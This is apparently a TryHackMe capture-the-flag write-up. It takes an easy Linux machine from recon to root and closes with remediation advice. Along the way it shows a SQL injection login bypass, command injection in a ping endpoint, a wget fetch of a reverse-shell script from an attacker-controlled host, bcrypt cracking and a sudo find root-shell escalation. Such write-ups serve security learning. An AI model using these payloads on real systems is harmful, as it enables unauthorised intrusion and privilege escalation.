# [Operation Promotion]


| **Platform**       | [TryHackMe](https://tryhackme.com)                      |
| ------------------ | ------------------------------------------------------- |
| **Difficulty**     | Easy                                                    |
| **OS**             | Linux                                                   |
| **Date completed** | 2026-08-06                                              |
| **Key techniques** | `SQLi` `Command Injection` `Sudo Abuse` `Brute Forcing` |

---

## TL;DR

> Enumerating the website gives us access to a vulnerable admin login panel, where we can login as an admin  and inject commands into a legitimate application function. Once on the target system, credentials can be discovered and brute forced to gain elevated privileges on an SSH session. Finally, we can abuse sudo privileges to gain a root shell and complete the machine.

---

## Recon
We can run an initial nmap scan to understand the target system.

```bash
nmap -p- -T4 10.48.187.141
```
<img width="575" height="219" alt="image" src="https://github.com/user-attachments/assets/5cd19234-2d5e-4f8d-93a3-98a3ae1b3f2f" />

Now we can run a more detailed port scan to enumerate the active services and any possible vulnerabilities.

```Shell
nmap -p22,80,139,445 -sC -sV 10.48.187.141
```
<img width="814" height="510" alt="image" src="https://github.com/user-attachments/assets/265c35fc-58a9-49d4-b898-84728b5df44e" />


| Port | Service                  | Notes                                                                                            |
| ---- | ------------------------ | ------------------------------------------------------------------------------------------------ |
| 22   | OpenSSH 9.6p1            | Standard, may be useful later for privesc                                                        |
| 80   | Apache 2.4.58            | `robots.txt` has a disallowed entry, `/admin`, which we can check out later                      |
| 139  | netbios-ssn Samba smbd 4 |                                                                                                  |
| 445  | netbios-ssn Samba smbd 4 | This tells us that the OS is Linux and we may be able to authenticate into the shares as a guest |


Pulling up the Apache site just shows a static webpage with no links or useful information. We may be able to use the email at the bottom, `careers@recruitcorp.thm`, for a brute-force attack later.

<img width="1519" height="827" alt="image" src="https://github.com/user-attachments/assets/c9a9dcf3-ff12-4ced-a96e-1db95d7990ce" />


## Enumeration

The most interesting find are the samba shares, which we can enumerate using `crackmapexec`. These shares could contain useful files such as credentials, config files, or backups.

```Shell
crackmapexec smb 10.48.107.141 -u 'username' -p 'password' --shares
```

<img width="958" height="375" alt="image" src="https://github.com/user-attachments/assets/322e8471-71b0-4b29-9849-07f7b51958ad" />


It looks like we have READ access on the public share, let's check that now.

```Shell
smbclient \\\\10.48.187.141\\public
```

<img width="860" height="222" alt="image" src="https://github.com/user-attachments/assets/27819e3f-7ead-4e13-97e0-707d03849826" />


We authenticate to the public share as a guest by leaving the password field blank and find a README.txt file. Unfortunately, we cannot access the `IPC$` share. Let's read the file we extracted now.

<img width="594" height="96" alt="image" src="https://github.com/user-attachments/assets/3db65341-5d84-445c-81f0-c813737c2833" />


A dead end. Our only remaining path is the static website, where we can check the `/admin` page.

<img width="1512" height="823" alt="image" src="https://github.com/user-attachments/assets/a371eb58-1303-4647-b8fc-c0f0f8159529" />


Seeing as we don't have credentials, we can see if these fields are vulnerable to SQL injection.

## Login as Admin

We can try bypassing the legitimate login function by injecting a comment `--` to the end of our payload, which will be `admin'` in the username field.

<img width="466" height="400" alt="image" src="https://github.com/user-attachments/assets/a0080bda-9223-4545-82ea-6cd8f97a8d73" />


This works, and we're presented with `dashboard.php` which gives us access to a **User Lookup** feature. It appears that there are accounts with ID's from 1-9. Inputting any other value results in `no user with that ID.` There's nothing significant except for a note attached to the user with an ID of 7.

<img width="1554" height="520" alt="image" src="https://github.com/user-attachments/assets/ed5f18a9-487d-4c13-906b-1fd44040bf62" />


The note tells us that this user is the service account for `/admin/sysmaint/ping.php`. We can try accessing this endpoint ourselves. 

## www-data reverse shell

<img width="651" height="161" alt="image" src="https://github.com/user-attachments/assets/aef50699-3a63-4445-8219-a6772c025b66" />


The endpoint lets us interact without authentication. We can pass any target with the `host` parameter, and see what the result is.

```shell
http://10.49.142.135/admin/sysmaint-checks/ping.php?host=localhost
```

<img width="905" height="185" alt="image" src="https://github.com/user-attachments/assets/12a6db1a-1d4e-4f9f-8a1f-746c8055dc80" />


From this result, we can assume that our input is being passed into a `ping -c 1` command on a CLI. To achieve command injection, we have to append our own command while being careful not to break the original command. The first payload we'll try is `localhost; whoami`

```Shell
http://10.49.142.135/admin/sysmaint-checks/ping.php?host=localhost; whoami
```

<img width="960" height="190" alt="image" src="https://github.com/user-attachments/assets/51c3b6bd-0ee8-4aeb-8d94-53c9321b7fed" />


Our result is `www-data`. This confirms our ability to perform command injection. We confirm python is running on the target system by injecting `localhost; which python3`. 

<img width="1012" height="197" alt="image" src="https://github.com/user-attachments/assets/27fd70c2-acd7-47b8-aee7-727ebfa5b2e9" />

Using [revshells](https://www.revshells.com) we generate a python reverse shell and start an HTTP server using Python's built in `http.server` module.
```Shell
python3 -m http.server 8081
```

<img width="719" height="118" alt="image" src="https://github.com/user-attachments/assets/4f95071a-d4a9-485d-b7e9-4ee6dc5339f2" />


Back on the target machine, we inject `localhost; wget http://<IP>/rev.py`

<img width="1142" height="319" alt="image" src="https://github.com/user-attachments/assets/9a5ad617-c27f-46a0-a111-6fc5dcb5d090" />


The shell file was successfully saved to the target machine. Now we can run `chmod +x` on the file to grant it executable permissions. Because we are injecting commands into a URL, we need to URL encode special characters. The URL encoded version of `+` is `%2B`. Now we can set up a listener, which I use [Penelope](https://github.com/brightio/penelope) to handle. 

<img width="797" height="94" alt="image" src="https://github.com/user-attachments/assets/2e730008-ee2c-4dcc-94ce-af2e80a353cc" />


Now to gain the shell, we just inject `./rev.py`

<img width="1077" height="220" alt="image" src="https://github.com/user-attachments/assets/f570d8cf-603e-4bfd-9002-9ccf14705847" />


## Privilege Escalation

We've successfully gotten a `www-data` shell on the host. Now we can start enumerating for potential privilege escalation vectors. Looking around we find a config folder that contains a file named `db.conf`. The file provides us with a username and password hash, which we can start cracking with hashcat to potentially use to SSH in.
```
cd ..
ls
cd config
ls
cat db.conf
```

<img width="656" height="256" alt="image" src="https://github.com/user-attachments/assets/0ff433d9-37eb-46d2-9efd-e6a180b9352b" />

<img width="934" height="278" alt="image" src="https://github.com/user-attachments/assets/dd77f0f8-6e92-4047-a58b-9c4bf2f6d6bd" />

I realised that I had to look elsewhere, as cracking bcrypt hashes is not reliable due to the immense time sink. The static webpage contained unique keywords such as "recruit", "corp", and the mention of a spring 2026 hiring drive. I built a custom wordlist by manually scraping a few keywords, and transformed the wordlist using hashcat's dive rule.

```shell
hashcat words -r /usr/share/hashcat/rules/dive.rule --stdout > mutated_words.txt
```

<img width="716" height="53" alt="image" src="https://github.com/user-attachments/assets/26b3bca9-0be4-4cd7-b2da-9333f6d6addf" />


Now we can feed the mutated wordlist into hashcat and see if we can crack the hash any faster.

```Shell
hashcat -m 3200 -a 0 hash.txt mutated_wordlist.txt
```

<img width="646" height="403" alt="image" src="https://github.com/user-attachments/assets/94ca928c-0fc1-4f38-8033-227695d0fe9f" />


We successfully found `jfords` password and can now try this to login to SSH.

```Shell
ssh jford@<ip>
```

<img width="902" height="553" alt="image" src="https://github.com/user-attachments/assets/c9e019c9-6cd0-49b4-86f2-a6f60a752985" />


## Root Shell

I begin enumerating the system for local privilege escalation vectors. Immediately, I notice that `jford` is allowed to run `find` with `sudo`.  

<img width="828" height="134" alt="image" src="https://github.com/user-attachments/assets/09324879-6817-4101-8951-a4adebd85359" />

We do a quick check on [GTFOBins](https://gtfobins.org) to find a command that can spawn a root shell.

<img width="891" height="390" alt="image" src="https://github.com/user-attachments/assets/19b4781a-b55d-4c52-bf74-30508490ff68" />


```Shell
find . -exec /bin/sh \; -quit
```

<img width="485" height="84" alt="image" src="https://github.com/user-attachments/assets/ecfc3f7b-cbbc-4492-ac93-cf44fe5ed4be" />


Finally, we obtain a root shell and complete the machine.

## Why it worked

There were a few vulnerabilities within this application:
- The login panel was susceptible to SQL injection. This allowed us to authenticate as an admin user without any valid credentials
- Command injection allowed RCE (Remote Code Execution) because the developer assumed that users would only input hostnames. This assumption caused the developer to overlook the fact that they weren't escaping user input, allowing commands to be executed into the CLI.

Misconfigurations and poor security hygiene allowed us to elevate privileges from there:
- A password hash belonging to `jford` was stored on the system. We took the hash and cracked it offline to authenticate properly as `jford` into SSH.
- `jford` was given the ability to run the `find` command as the `root` user with `sudo`. The `find` command can execute commands such as the one above by passing the flag `-exec`. This effectively gives `jford` access to any command on the file system with elevated privileges.

## Remediation
- Parameterised queries on the login page
- Escape user input on `ping.php`
- Refrain from storing passwords or their hashes locally
- Review permissions given to users and follow the principle of least privilege

---

<sub>Written up for my own learning. All testing performed against systems I am
explicitly authorised to test.</sub>
